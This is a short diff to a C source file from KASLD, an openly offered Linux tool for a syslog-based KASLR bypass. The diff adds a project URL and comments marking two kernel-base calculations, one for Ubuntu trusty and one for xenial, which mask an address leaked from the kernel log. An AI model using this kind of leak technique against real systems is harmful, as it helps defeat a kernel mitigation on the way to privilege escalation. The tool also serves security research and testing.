@@ -1,4 +1,4 @@
-// This file is part of KASLD
+// This file is part of KASLD - https://github.com/bcoles/kasld
 // syslog KASLR bypass
 // Requires kernel.dmesg_restrict = 0 (Default on Ubuntu systems); or CAP_SYSLOG capabilities.
 // - https://web.archive.org/web/20171029060939/http://www.blackbunny.io/linux-kernel-x86-64-bypass-smep-kaslr-kptr_restric/
@@ -98,7 +98,10 @@ int main (int argc, char **argv) {
 
   printf("leaked address: %lx\n", addr);
 
+  /* ubuntu trusty */
   printf("kernel base (likely): %lx\n", addr & 0xffffffffff000000ul);
+
+  /* ubuntu xenial */
   printf("kernel base (likely): %lx\n", (addr & 0xfffffffffff00000ul) - 0x1000000ul);
 
   return 0;
